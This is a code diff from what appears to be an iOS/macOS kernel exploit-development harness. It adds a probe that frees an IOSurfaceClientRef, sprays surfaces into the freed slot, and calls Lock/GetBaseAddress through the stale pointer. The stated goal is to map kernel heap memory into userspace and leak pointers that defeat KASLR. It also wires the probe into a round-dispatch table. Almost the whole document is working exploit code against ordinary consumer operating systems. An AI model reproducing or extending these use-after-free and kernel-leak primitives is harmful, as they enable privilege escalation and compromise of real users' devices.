@@ -15901,6 +15901,259 @@ static void r362_probe(void) {
     fflush(stdout);
 }
 
+/* r364: IOSurfaceClientRef UAF backing store redirect for kernel read.
+ * The client ref has a kernel heap pointer at +88. We'll:
+ * 1. Map the client ref in detail (all IOSurface client APIs that read from it)
+ * 2. UAF the client, spray with modified +88 pointing to known GPU heap addr
+ * 3. Call Lock/GetBaseAddress through stale ptr to see if we get kernel memory mapped
+ * 4. If mapped, read vtable pointers from heap objects → KASLR slide
+ */
+static void r364_probe(void) {
+    rlog("\n=== r364: IOSurfaceClientRef Backing Store Redirect ===\n\n");
+    fflush(stdout);
+
+    void *iosurfH = dlopen("/System/Library/Frameworks/IOSurface.framework/IOSurface", RTLD_NOW);
+    typedef void* IOSurfaceClientRef;
+    typedef IOSurfaceClientRef (*clientLookup_t)(uint32_t);
+    typedef void (*clientRelease_t)(IOSurfaceClientRef);
+    typedef void (*clientRetain_t)(IOSurfaceClientRef);
+    typedef kern_return_t (*clientLock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
+    typedef kern_return_t (*clientUnlock_t)(IOSurfaceClientRef, uint32_t, uint32_t*);
+    typedef void* (*clientGetBaseAddr_t)(IOSurfaceClientRef);
+    typedef size_t (*clientGetBPR_t)(IOSurfaceClientRef);
+    typedef void (*clientSetValue_t)(IOSurfaceClientRef, CFStringRef, CFTypeRef);
+    typedef CFTypeRef (*clientCopyValue_t)(IOSurfaceClientRef, CFStringRef);
+    clientLookup_t clLookup = (clientLookup_t)dlsym(iosurfH, "IOSurfaceClientLookup");
+    clientRelease_t clRelease = (clientRelease_t)dlsym(iosurfH, "IOSurfaceClientRelease");
+    clientRetain_t clRetain = (clientRetain_t)dlsym(iosurfH, "IOSurfaceClientRetain");
+    clientLock_t clLock = (clientLock_t)dlsym(iosurfH, "IOSurfaceClientLock");
+    clientUnlock_t clUnlock = (clientUnlock_t)dlsym(iosurfH, "IOSurfaceClientUnlock");
+    clientGetBaseAddr_t clGetBase = (clientGetBaseAddr_t)dlsym(iosurfH, "IOSurfaceClientGetBaseAddress");
+    clientGetBPR_t clGetBPR = (clientGetBPR_t)dlsym(iosurfH, "IOSurfaceClientGetBytesPerRow");
+    clientSetValue_t clSetValue = (clientSetValue_t)dlsym(iosurfH, "IOSurfaceClientSetValue");
+    clientCopyValue_t clCopyValue = (clientCopyValue_t)dlsym(iosurfH, "IOSurfaceClientCopyValue");
+
+    if (!clLookup || !clRelease) {
+        rlog("  FATAL: missing IOSurface client APIs\n");
+        if (iosurfH) dlclose(iosurfH);
+        return;
+    }
+    rlog("  APIs resolved: Lookup=%p Release=%p Lock=%p GetBase=%p GetBPR=%p\n",
+        (void*)clLookup, (void*)clRelease, (void*)clLock, (void*)clGetBase, (void*)clGetBPR);
+
+    int w=64, h=64, bpe=4, bpr=64*4, pf=0x42475241, as_=64*64*4;
+    CFStringRef kW = CFStringCreateWithCString(NULL, "IOSurfaceWidth", kCFStringEncodingASCII);
+    CFStringRef kH = CFStringCreateWithCString(NULL, "IOSurfaceHeight", kCFStringEncodingASCII);
+    CFStringRef kB = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerElement", kCFStringEncodingASCII);
+    CFStringRef kR = CFStringCreateWithCString(NULL, "IOSurfaceBytesPerRow", kCFStringEncodingASCII);
+    CFStringRef kP = CFStringCreateWithCString(NULL, "IOSurfacePixelFormat", kCFStringEncodingASCII);
+    CFStringRef kA = CFStringCreateWithCString(NULL, "IOSurfaceAllocSize", kCFStringEncodingASCII);
+    CFNumberRef nW = CFNumberCreate(NULL, kCFNumberIntType, &w);
+    CFNumberRef nH = CFNumberCreate(NULL, kCFNumberIntType, &h);
+    CFNumberRef nB = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+    CFNumberRef nR = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+    CFNumberRef nP = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+    CFNumberRef nA = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+    CFStringRef keys364[] = {kW, kH, kB, kR, kP, kA};
+    CFTypeRef vals364[] = {nW, nH, nB, nR, nP, nA};
+    CFDictionaryRef props = CFDictionaryCreate(NULL,
+        (const void**)keys364, (const void**)vals364, 6,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+    /* ---- Part 1: Detailed client ref analysis with Lock/GetBase ---- */
+    rlog("--- Part 1: Client ref behavior before UAF ---\n");
+    fflush(stdout);
+
+    IOSurfaceRef surf_a = IOSurfaceCreate(props);
+    if (!surf_a) { rlog("  FATAL: IOSurfaceCreate failed\n"); goto r364_cleanup; }
+    uint32_t sid_a = IOSurfaceGetID(surf_a);
+    rlog("  Surface A: ID=%u\n", sid_a);
+
+    IOSurfaceClientRef client_a = clLookup(sid_a);
+    if (!client_a) { rlog("  FATAL: ClientLookup failed\n"); CFRelease(surf_a); goto r364_cleanup; }
+    rlog("  Client at %p\n", client_a);
+
+    /* Get the kernel pointer and other key fields before any operations */
+    uint8_t *cb = (uint8_t*)client_a;
+    uint64_t kptr_at_88; memcpy(&kptr_at_88, cb + 88, 8);
+    uint32_t sid_at_136; memcpy(&sid_at_136, cb + 136, 4);
+    uint64_t uptr_112; memcpy(&uptr_112, cb + 112, 8);
+    uint64_t uptr_120; memcpy(&uptr_120, cb + 120, 8);
+    uint64_t uptr_128; memcpy(&uptr_128, cb + 128, 8);
+    rlog("  +88 (kptr): 0x%llx\n", (unsigned long long)kptr_at_88);
+    rlog("  +112: 0x%llx  +120: 0x%llx  +128: 0x%llx\n",
+        (unsigned long long)uptr_112, (unsigned long long)uptr_120, (unsigned long long)uptr_128);
+    rlog("  +136 (sid): %u\n", sid_at_136);
+
+    /* Lock the surface and check base address */
+    void *base_before = NULL;
+    if (clLock && clGetBase) {
+        uint32_t seed = 0;
+        kern_return_t lk = clLock(client_a, 3 /* kIOSurfaceLockReadWrite */, &seed);
+        rlog("  Lock result: 0x%x seed=%u\n", lk, seed);
+        base_before = clGetBase(client_a);
+        rlog("  GetBaseAddress: %p\n", base_before);
+
+        /* Check what's at the base address */
+        if (base_before) {
+            rlog("  First 64 bytes of mapped surface:\n");
+            uint8_t *bp = (uint8_t*)base_before;
+            for (int row = 0; row < 64; row += 32) {
+                rlog("    +%03d: ", row);
+                for (int col = 0; col < 32; col += 8) {
+                    uint64_t v; memcpy(&v, bp + row + col, 8);
+                    rlog("%016llx ", (unsigned long long)v);
+                }
+                rlog("\n");
+            }
+        }
+
+        /* Check client ref AFTER lock — did +88 or other fields change? */
+        uint64_t kptr_post_lock; memcpy(&kptr_post_lock, cb + 88, 8);
+        if (kptr_post_lock != kptr_at_88) {
+            rlog("  +88 CHANGED after lock: 0x%llx -> 0x%llx\n",
+                (unsigned long long)kptr_at_88, (unsigned long long)kptr_post_lock);
+        }
+
+        clUnlock(client_a, 3, &seed);
+    }
+
+    /* Scan ENTIRE client ref for interesting changes */
+    rlog("\n  Full 448-byte scan for all kernel/interesting values:\n");
+    for (int off = 0; off < 448; off += 8) {
+        uint64_t v; memcpy(&v, cb + off, 8);
+        if (v == 0 || v == 0xFFFFFFFFFFFFFFFFULL) continue;
+        if (v == 0x4d55545a4d55545aULL || v == 0x4d55545a00000000ULL) continue; /* MUTZ */
+        if ((v >> 32) == 0x4d55545a) continue;
+        rlog("    +%d: 0x%llx", off, (unsigned long long)v);
+        if (v >= 0xFFFFFFF000000000ULL && v < 0xFFFFFFFF00000000ULL) rlog(" [KPTR]");
+        else if (v >= 0x100000000ULL && v < 0x200000000ULL) rlog(" [uptr]");
+        rlog("\n");
+    }
+
+    /* ---- Part 2: Create second surface, examine its client pointer ---- */
+    rlog("\n--- Part 2: Compare two client refs ---\n");
+    fflush(stdout);
+
+    IOSurfaceRef surf_b = IOSurfaceCreate(props);
+    uint32_t sid_b = surf_b ? IOSurfaceGetID(surf_b) : 0;
+    IOSurfaceClientRef client_b = surf_b ? clLookup(sid_b) : NULL;
+    if (client_b) {
+        uint8_t *cb2 = (uint8_t*)client_b;
+        uint64_t kptr2; memcpy(&kptr2, cb2 + 88, 8);
+        rlog("  Surface B: ID=%u, client=%p, kptr[+88]=0x%llx\n",
+            sid_b, client_b, (unsigned long long)kptr2);
+        rlog("  Delta from A: kptr diff = %+lld\n", (long long)(kptr2 - kptr_at_88));
+
+        /* Both surfaces are 64x64 BGRA = 16KB. If kptr is the kernel IOSurface object,
+           the difference tells us the allocation stride */
+    }
+
+    /* ---- Part 3: UAF + test stale Lock/GetBase ---- */
+    rlog("\n--- Part 3: UAF + stale Lock/GetBase test ---\n");
+    fflush(stdout);
+
+    /* Save full client memory before freeing */
+    uint8_t saved[448];
+    memcpy(saved, cb, 448);
+
+    /* Release the client ref but keep the stale pointer */
+    clRelease(client_a);
+    rlog("  Freed client_a, stale ptr = %p\n", client_a);
+
+    /* Create a surface to replace A's slot */
+    IOSurfaceRef surf_c = IOSurfaceCreate(props);
+    uint32_t sid_c = surf_c ? IOSurfaceGetID(surf_c) : 0;
+    rlog("  Surface C: ID=%u\n", sid_c);
+
+    /* Check if the stale pointer's memory was reused */
+    uint8_t *stale = (uint8_t*)client_a;
+    int changed_bytes = 0;
+    for (int i = 0; i < 448; i++) {
+        if (stale[i] != saved[i]) changed_bytes++;
+    }
+    rlog("  Stale ptr: %d/448 bytes changed after free+realloc\n", changed_bytes);
+
+    /* Dump key fields of the stale pointer now */
+    uint64_t stale_kptr; memcpy(&stale_kptr, stale + 88, 8);
+    uint32_t stale_sid; memcpy(&stale_sid, stale + 136, 4);
+    rlog("  Stale +88: 0x%llx (was 0x%llx)\n",
+        (unsigned long long)stale_kptr, (unsigned long long)kptr_at_88);
+    rlog("  Stale +136: %u (was %u)\n", stale_sid, sid_at_136);
+
+    if (stale_kptr != kptr_at_88) {
+        rlog("  *** KPTR CHANGED — new allocation landed in client slot! ***\n");
+        /* If the new kptr points to surf_c's kernel object, we now control
+           which surface operations go to via the kptr at +88 */
+    }
+
+    /* Try Lock on the stale pointer — be careful, could panic */
+    rlog("  Testing GetBaseAddress through stale pointer...\n");
+    fflush(stdout);
+    if (clGetBase) {
+        void *stale_base = clGetBase((IOSurfaceClientRef)client_a);
+        rlog("  Stale GetBaseAddress: %p (original was %p)\n", stale_base, base_before);
+        if (stale_base && stale_base != base_before) {
+            rlog("  *** BASE ADDRESS REDIRECTED! ***\n");
+            /* Read the first 64 bytes from the redirected mapping */
+            uint8_t *sp = (uint8_t*)stale_base;
+            rlog("  Redirected mapping first 64 bytes:\n");
+            for (int row = 0; row < 64; row += 32) {
+                rlog("    +%03d: ", row);
+                for (int col = 0; col < 32; col += 8) {
+                    uint64_t v; memcpy(&v, sp + row + col, 8);
+                    rlog("%016llx ", (unsigned long long)v);
+                    /* Check for kernel text pointers */
+                    if (v > 0xFFFFFFF007004000ULL && v < 0xFFFFFFF027004000ULL) {
+                        rlog("[SLID_TEXT!] ");
+                    }
+                }
+                rlog("\n");
+            }
+        }
+    }
+
+    /* Try Lock then GetBase */
+    if (clLock && clGetBase) {
+        rlog("  Testing Lock+GetBase through stale pointer...\n");
+        fflush(stdout);
+        uint32_t seed = 0;
+        kern_return_t lk = clLock((IOSurfaceClientRef)client_a, 1 /* read-only */, &seed);
+        rlog("  Stale Lock result: 0x%x\n", lk);
+        if (lk == KERN_SUCCESS) {
+            void *stale_locked_base = clGetBase((IOSurfaceClientRef)client_a);
+            rlog("  Stale locked base: %p\n", stale_locked_base);
+            if (stale_locked_base) {
+                rlog("  Locked mapping first 128 bytes:\n");
+                uint8_t *slb = (uint8_t*)stale_locked_base;
+                for (int row = 0; row < 128; row += 32) {
+                    rlog("    +%03d: ", row);
+                    for (int col = 0; col < 32; col += 8) {
+                        uint64_t v; memcpy(&v, slb + row + col, 8);
+                        rlog("%016llx ", (unsigned long long)v);
+                    }
+                    rlog("\n");
+                }
+            }
+            clUnlock((IOSurfaceClientRef)client_a, 1, &seed);
+        }
+    }
+
+    /* Cleanup */
+    if (surf_c) CFRelease(surf_c);
+    if (client_b) clRelease(client_b);
+    if (surf_b) CFRelease(surf_b);
+    CFRelease(surf_a);
+
+r364_cleanup:
+    CFRelease(props);
+    CFRelease(kW); CFRelease(kH); CFRelease(kB); CFRelease(kR); CFRelease(kP); CFRelease(kA);
+    CFRelease(nW); CFRelease(nH); CFRelease(nB); CFRelease(nR); CFRelease(nP); CFRelease(nA);
+    if (iosurfH) dlclose(iosurfH);
+    rlog("\n=== r364 complete ===\n");
+    fflush(stdout);
+}
+
 /* r363: IOSurfaceClientRef UAF layout dump + type confusion KASLR leak.
  * 1. Create IOSurfaceClientRef, dump its raw memory to identify fields
  * 2. Free client, spray controlled data into the 448-byte slot
@@ -54540,6 +54793,14 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 367) {
+            rlog("*** rounds=367: IOSurfaceClientRef Backing Store Redirect ***\n");
+            rlog("  UAF the client, test Lock/GetBase through stale pointer\n");
+            rlog("  to map arbitrary kernel heap memory into userspace.\n\n");
+            fflush(stdout);
+            r364_probe();
+            goto done;
+        }
         if (rounds == 366) {
             rlog("*** rounds=366: IOSurfaceClientRef UAF Type Confusion ***\n");
             rlog("  Dump client layout, UAF + spray, type-confused CopyValue\n\n");
@@ -56679,7 +56940,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
@@ -66521,7 +66782,7 @@ new_modes:
          *   - Create VideoToolbox session, fuzz parameters for OOB read
          *   - Look for kernel pointer leaks in output buffers
          */
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
             if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227 || rounds == 228) goto r220_block;
 
